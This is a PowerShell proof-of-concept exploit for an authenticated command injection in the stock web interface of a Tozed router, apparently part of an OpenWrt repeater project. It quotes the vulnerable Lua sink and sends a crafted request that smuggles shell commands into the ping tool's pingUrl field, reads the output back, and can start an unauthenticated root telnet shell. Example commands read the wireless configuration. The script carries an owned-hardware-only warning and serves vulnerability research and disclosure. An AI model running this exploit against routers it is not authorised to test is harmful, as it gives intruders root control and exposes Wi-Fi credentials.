<#
    p145-inject.ps1 — Proof of concept for the authenticated command injection
                      in the stock Tozed web UI (cmd=145).

    Author : Nipun Methmal (c) 2026 — MIT License
    Part of: p11idu-openwrt-repeater
    Full analysis: docs/04-rce-cmd-145.md

    VULNERABLE SINK (usr/lib/lua/tz/system.lua, stock firmware):

        if "ping_start" == tz_req["tool"] then
            os.execute(string.format(
                "softlimit -f %d ping -c %s %s > %s &",
                LOG_FILE_LIMIT, tz_req["pingNum"], tz_req["pingUrl"],
                TMP_NETWORK_TOOL_LOG_FILE))

    `pingUrl` is passed to os.execute (i.e. /bin/sh -c) with no sanitisation, and the
    command's stdout is redirected to /tmp/log_tar/network_tool_log — which the same
    endpoint hands back to you on tool=get_log. That is what makes this a *readable*
    injection rather than a blind one.

    ┌────────────────────────────────────────────────────────────────────┐
    │  AUTHORISED USE ONLY. Run this solely against hardware YOU OWN.    │
    │  It is a real defect in shipping firmware. If you find it on a     │
    │  device you do not own, report it to the vendor/ISP.               │
    └────────────────────────────────────────────────────────────────────┘

    Usage:
        & p145-inject.ps1 -SessionId $sid -Command 'id'
        & p145-inject.ps1 -SessionId $sid -Command 'cat /etc/config/wireless'
        & p145-inject.ps1 -SessionId $sid -ReadBack          # tool=get_log
#>
param(
    [Parameter(Mandatory = $true)][string]$SessionId,
    [string]$Command    = 'id; uname -a',
    [string]$HostAddr   = '192.168.8.1',
    [int]   $ReadMs     = 8000,
    [switch]$ReadBack,
    [switch]$SpawnTelnet,
    [int]   $TelnetPort = 2323
)
$ErrorActionPreference = 'Stop'

function Invoke-Lua([hashtable]$body, [int]$timeoutMs = 8000) {
    $payload = $body | ConvertTo-Json -Compress -Depth 5
    $bh  = [Text.Encoding]::UTF8.GetBytes($payload)
    $hdr = "POST /cgi-bin/lua.cgi HTTP/1.1`r`n" +
           "Host: $HostAddr`r`n" +
           "User-Agent: Mozilla/5.0 Chrome/120`r`n" +
           "Accept: */*`r`n" +
           "X-Requested-With: XMLHttpRequest`r`n" +
           "Origin: http://$HostAddr`r`n" +
           "Content-Type: application/json; charset=UTF-8`r`n" +
           "Content-Length: $($bh.Length)`r`n" +
           "Connection: close`r`n`r`n"

    $c = New-Object Net.Sockets.TcpClient
    $c.Connect($HostAddr, 80)
    $st = $c.GetStream()
    $req = [Text.Encoding]::ASCII.GetBytes($hdr) + $bh
    $st.Write($req, 0, $req.Length); $st.Flush()

    $ms = New-Object IO.MemoryStream
    $buf = New-Object byte[] 65536
    $sw = [Diagnostics.Stopwatch]::StartNew()
    $idle = [Diagnostics.Stopwatch]::StartNew()
    while ($sw.ElapsedMilliseconds -lt $timeoutMs) {
        if ($st.DataAvailable) {
            $n = $st.Read($buf, 0, $buf.Length)
            if ($n -le 0) { break }
            $ms.Write($buf, 0, $n); $idle.Restart()
        } else {
            if ($c.Client.Poll(0, [Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0) { break }
            if ($idle.ElapsedMilliseconds -gt 2500) { break }
            Start-Sleep -Milliseconds 25
        }
    }
    $c.Close()
    $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray())
    $i = $txt.IndexOf('{')
    return @{ Elapsed = $sw.ElapsedMilliseconds; Json = $(if ($i -ge 0) { $txt.Substring($i) } else { '' }) }
}

if ($SpawnTelnet) {
    # Persist a root shell on an unused port, exactly as in docs/05-root-shell.md
    $Command = "telnetd -l /bin/sh -p $TelnetPort"
}

if ($ReadBack) {
    # Read back /tmp/log_tar/network_tool_log — the output of whatever we executed
    $r = Invoke-Lua @{
        cmd = 145; sessionId = $SessionId; language = 'EN'; method = 'POST'
        tool = 'get_log'
    }
    "ELAPSED: $($r.Elapsed) ms"
    "JSON   : $($r.Json)"
    return
}

# --- the injection ---------------------------------------------------------
# pingUrl is formatted into:  ping -c <pingNum> <pingUrl> > <logfile> &
$injected = "127.0.0.1; $Command"

$r = Invoke-Lua @{
    cmd       = 145
    sessionId = $SessionId
    language  = 'EN'
    method    = 'POST'
    tool      = 'ping_start'
    pingLoop  = '0'
    pingNum   = '1'
    pingUrl   = $injected
}

"ELAPSED  : $($r.Elapsed) ms"
"INJECTED : $injected"
"JSON     : $($r.Json)"

if ($SpawnTelnet) {
    ""
    "Listener requested on port $TelnetPort. Check it:"
    "    Test-NetConnection $HostAddr -Port $TelnetPort"
}
""
"Read the command output with:  -ReadBack"
